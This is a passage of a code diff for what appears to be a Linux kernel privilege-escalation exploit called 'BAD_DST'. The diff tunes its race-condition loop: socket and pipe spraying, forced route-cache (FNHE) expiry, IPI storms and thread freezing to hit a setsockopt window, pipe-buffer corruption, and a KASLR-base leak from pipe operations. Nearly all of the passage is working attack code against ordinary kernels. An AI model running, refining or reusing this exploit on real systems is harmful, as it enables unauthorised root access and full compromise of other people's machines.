             attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count);
@@ -3103,12 +3514,22 @@ void trigger_vuln_loop() {
         ctx.vuln_socket = open_vuln_ipv4_udp_socket();
         u64 vuln_ready_ns = now_ns();
 
+        if (open_post_before_pipe_prepare) {
+            open_post_sockets_if_needed(&ctx, &post_sockets_open,
+                                        "pre_pipe_prepare");
+        }
+
         if (prepare_pipes_before_race) {
             prepare_exploit_pipes(&prepared_pipes);
         } else if (prepare_page_pipes_before_race) {
             prepare_page_pipes(&prepared_pipes);
         }
         sleep_until_elapsed_us(vuln_ready_ns, pre_race_expire_us);
+        if (expire_fnhe_before_race) {
+            trigger_pre_race_fnhe_expiry(attempt, vuln_ready_ns,
+                                         pre_race_fnhe_expire_us,
+                                         expire_with_lookup_only);
+        }
 
         int sixseven = 67;
         // int sixnine = 69;
@@ -3116,15 +3537,19 @@ void trigger_vuln_loop() {
         SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
         LOG("debug triggered");
 
-        open_many_sockets(ctx.post_sockets, ctx.post_socket_count);
+        open_post_sockets_if_needed(&ctx, &post_sockets_open, "debug_after_trigger");
 
         sleep_us_checked(env_usize("BAD_DST_POST_RACE_SLEEP_US", post_race_sleep_default_us));
-        if (fnhe_expire_total_us != 0) {
-            sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
+        if (!skip_post_race_fnhe_cleanup) {
+            if (fnhe_expire_total_us != 0) {
+                sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
+            }
+            // trigger invalidation of mtu entry
+            trigger_expired_fnhe_cleanup(expire_with_lookup_only);
+            sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));
+        } else {
+            trace_marker("attempt=%lu stage=skip_post_race_fnhe_cleanup", attempt);
         }
-        // trigger invalidation of mtu entry
-        trigger_expired_fnhe_cleanup(expire_with_lookup_only);
-        sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));
 
         ctx.critical_start_ns = now_ns();
         if (try_run_main_exploit(&ctx, &prepared_pipes)) {
@@ -3149,6 +3574,9 @@ void trigger_vuln_loop() {
     bool require_stack_target = env_usize("BAD_DST_REQUIRE_STACK_TARGET", 0);
     bool use_done_oracle = env_usize("BAD_DST_DONE_ORACLE", 1);
     usize done_oracle_settle_us = env_usize("BAD_DST_DONE_ORACLE_SETTLE_US", 0);
+    bool measure_timing_only = env_usize("BAD_DST_MEASURE_TIMING_ONLY", 0);
+    bool require_setsockopt_enter_stage = env_usize(
+        "BAD_DST_REQUIRE_SETSOCKOPT_ENTER_STAGE", 0);
 
     for (usize attempt = 1; max_attempts == 0 || attempt <= max_attempts; attempt++) {
         ctx.timer_offset = timer_offset_for_attempt(ctx.timer_offset, attempt);
@@ -3156,13 +3584,14 @@ void trigger_vuln_loop() {
         atomic_store(&ctx.pre_syscall_delay_ns, pre_syscall_delay_ns);
 
         usize align_pad = fixed_align_pad == (usize)-1 ?
-            ((attempt - 1) % NUM_ALIGN_PAD_SOCKETS) :
-            (fixed_align_pad % NUM_ALIGN_PAD_SOCKETS);
+            ((attempt - 1) % align_pad_span) :
+            (fixed_align_pad % align_pad_span);
 
-        ctx.pre_socket_count = NUM_BASE_PRE_SOCKETS + align_pad;
-        ctx.post_socket_count = NUM_POST_SOCKETS;
+        ctx.pre_socket_count = base_pre_socket_count + align_pad;
+        ctx.post_socket_count = post_socket_count;
         ctx.align_pad = align_pad;
         ExploitPipeSet prepared_pipes = { 0 };
+        bool post_sockets_open = false;
 
         LOG("start real race attempt=%lu align_pad=%lu pre=%lu post=%lu timer_offset=%lu pre_syscall_delay=%lu",
             attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count,
@@ -3180,6 +3609,11 @@ void trigger_vuln_loop() {
         u64 vuln_ready_ns = now_ns();
         trace_marker("attempt=%lu stage=vuln_socket_open fd=%d", attempt, ctx.vuln_socket);
 
+        if (open_post_before_pipe_prepare) {
+            open_post_sockets_if_needed(&ctx, &post_sockets_open,
+                                        "pre_pipe_prepare");
+        }
+
         if (prepare_pipes_before_race) {
             prepare_exploit_pipes(&prepared_pipes);
         } else if (prepare_page_pipes_before_race) {
@@ -3188,11 +3622,22 @@ void trigger_vuln_loop() {
         sleep_until_elapsed_us(vuln_ready_ns, pre_race_expire_us);
         trace_marker("attempt=%lu stage=pre_race_ready pre_expire_us=%lu prepared_pipes=%d",
             attempt, pre_race_expire_us, exploit_pipe_set_has_active(&prepared_pipes));
+        if (expire_fnhe_before_race) {
+            trigger_pre_race_fnhe_expiry(attempt, vuln_ready_ns,
+                                         pre_race_fnhe_expire_us,
+                                         expire_with_lookup_only);
+        }
 
         u64 trigger_done_before = (u64) atomic_load(&ctx.trigger_done_counter);
         int futex_done_before = atomic_load(&ctx.futex_timer_done);
         set_cpu1_block_state(&ctx, 1);
         reset_trigger_timing_diag(&ctx);
+
+        if (!env_usize("BAD_DST_IPI_STORM_START_IN_TRIGGER", 0)) {
+            start_ipi_storm(&ctx);
+            trace_marker("attempt=%lu stage=ipi_storm_start epoch=%d",
+                attempt, atomic_load(&ctx.ipi_storm_epoch));
+        }
 
         // let trigger know it can continue another iteration
         u8 buf = 0;
@@ -3225,6 +3670,7 @@ void trigger_vuln_loop() {
             (void) release_frozen_trigger(&ctx, trigger_pid, trigger_done_before);
             SYSCHK(close(ctx.vuln_socket));
             close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+            close_post_sockets_if_open(&ctx, &post_sockets_open);
             close_prepared_exploit_pipes(&prepared_pipes, false, "timer timeout");
             reset_spray();
             continue;
@@ -3241,12 +3687,44 @@ void trigger_vuln_loop() {
         log_trigger_timing_diag(&ctx, attempt, "after_pin_trigger");
         trace_marker("attempt=%lu stage=after_pin_trigger rc=%d errno=%d",
             attempt, pin_rc, pin_errno);
+        stop_ipi_storm(&ctx);
 
         iteration_count += 1;
 
+        progress_trigger_to_setsockopt_enter(&ctx, trigger_pid);
+
         u64 pulse_ns = race_pulse_ns_for_attempt(attempt);
+        if (env_usize("BAD_DST_CPU0_NOISE_BEFORE_FINE_PULSE", 0)) {
+            wake_cpu0_noise_threads(&ctx);
+            trace_marker("attempt=%lu stage=cpu0_noise_before_fine_pulse", attempt);
+        }
         if (pulse_ns != 0) {
-            pulse_frozen_trigger(&ctx, trigger_pid, pulse_ns);
+            pulse_frozen_trigger_with_repin(&ctx, trigger_pid, pulse_ns, true);
+        }
+        if (env_usize("BAD_DST_CPU0_NOISE_AFTER_FINE_PULSE", 0)) {
+            wake_cpu0_noise_threads(&ctx);
+            trace_marker("attempt=%lu stage=cpu0_noise_after_fine_pulse", attempt);
+        }
+
+        if (measure_timing_only) {
+            trace_marker("attempt=%lu stage=measure_release", attempt);
+            if (!release_frozen_trigger(&ctx, trigger_pid, trigger_done_before)) {
+                LOG("FAIL: trigger did not release during timing measurement");
+                trace_marker("attempt=%lu stage=measure_release_timeout", attempt);
+                for (;;) {
+                    sleep(1000);
+                }
+            }
+            log_trigger_timing_diag(&ctx, attempt, "after_measure_release");
+            trace_marker("attempt=%lu stage=measure_done", attempt);
+
+            SYSCHK(close(ctx.vuln_socket));
+            close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+            close_post_sockets_if_open(&ctx, &post_sockets_open);
+            close_prepared_exploit_pipes(&prepared_pipes, false, "timing measure");
+            reset_spray();
+
+            continue;
         }
 
         if (use_done_oracle) {
@@ -3258,7 +3736,37 @@ void trigger_vuln_loop() {
 
                 SYSCHK(close(ctx.vuln_socket));
                 close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+                close_post_sockets_if_open(&ctx, &post_sockets_open);
                 close_prepared_exploit_pipes(&prepared_pipes, false, "trigger already done");
+                reset_spray();
+
+                continue;
+            }
+        }
+
+        if (require_setsockopt_enter_stage) {
+            int trigger_stage = atomic_load(&ctx.trigger_stage);
+            if (trigger_stage != TRIGGER_STAGE_SETSOCKOPT_ENTER) {
+                StackOracleState reason =
+                    trigger_stage < TRIGGER_STAGE_SETSOCKOPT_ENTER ?
+                    STACK_ORACLE_TOO_EARLY : STACK_ORACLE_TOO_LATE;
+                LOG("race miss before freeze: trigger stage %s",
+                    trigger_stage_name(trigger_stage));
+                trace_marker("attempt=%lu stage=stage_gate_miss trigger_stage=%s",
+                    attempt, trigger_stage_name(trigger_stage));
+                adjust_timer_offset(&ctx.timer_offset, reason);
+
+                if (!release_frozen_trigger(&ctx, trigger_pid, trigger_done_before)) {
+                    LOG("FAIL: trigger did not release after trigger-stage miss");
+                    for (;;) {
+                        sleep(1000);
+                    }
+                }
+
+                SYSCHK(close(ctx.vuln_socket));
+                close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+                close_post_sockets_if_open(&ctx, &post_sockets_open);
+                close_prepared_exploit_pipes(&prepared_pipes, false, "trigger stage miss");
                 reset_spray();
 
                 continue;
@@ -3312,6 +3820,7 @@ void trigger_vuln_loop() {
             }
             SYSCHK(close(ctx.vuln_socket));
             close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+            close_post_sockets_if_open(&ctx, &post_sockets_open);
             close_prepared_exploit_pipes(&prepared_pipes, false, "miss before freeze");
             reset_spray();
 
@@ -3338,6 +3847,7 @@ void trigger_vuln_loop() {
                 env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
             SYSCHK(close(ctx.vuln_socket));
             close_fds(ctx.pre_sockets, ctx.pre_socket_count);
+            close_post_sockets_if_open(&ctx, &post_sockets_open);
             close_prepared_exploit_pipes(&prepared_pipes, false, "miss after freeze");
             reset_spray();
 
@@ -3349,14 +3859,18 @@ void trigger_vuln_loop() {
             attempt, stack_oracle_state_name(stack_state));
         ctx.critical_start_ns = now_ns();
 
-        open_many_sockets(ctx.post_sockets, ctx.post_socket_count);
+        open_post_sockets_if_needed(&ctx, &post_sockets_open, "candidate");
 
         sleep_us_checked(env_usize("BAD_DST_POST_RACE_SLEEP_US", post_race_sleep_default_us));
-        if (fnhe_expire_total_us != 0) {
-            sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
+        if (!skip_post_race_fnhe_cleanup) {
+            if (fnhe_expire_total_us != 0) {
+                sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
+            }
+            trigger_expired_fnhe_cleanup(expire_with_lookup_only);
+            sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));
+        } else {
+            trace_marker("attempt=%lu stage=skip_post_race_fnhe_cleanup", attempt);
         }
-        trigger_expired_fnhe_cleanup(expire_with_lookup_only);
-        sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));
 
         LOG("\nrun exploit...");
         trace_marker("attempt=%lu stage=run_exploit", attempt);
@@ -3624,6 +4138,7 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
     if (!have_corrupt_pipe) {
         // will retry exit after failure
         LOG("FAIL: could not corrupt pipe");
+        log_pipe_corruption_miss_stats(vuln_pipes, vuln_pipe_count);
         trace_marker("attempt=%lu stage=pipe_corrupt_fail", trace_marker_attempt);
 
         // close all resources used in exploit
@@ -3736,7 +4251,7 @@ bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
 
     global_rw_context = rw_context;
 
-    kaslr_base = rw_context.pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
+    kaslr_base = rw_context.pipe_buffer_leak.ops - pipe_ops_offset();
     LOG("kaslr base: %lx", kaslr_base);
 
     vmem_base = env_usize("BAD_DST_VMEMMAP_BASE", 0);
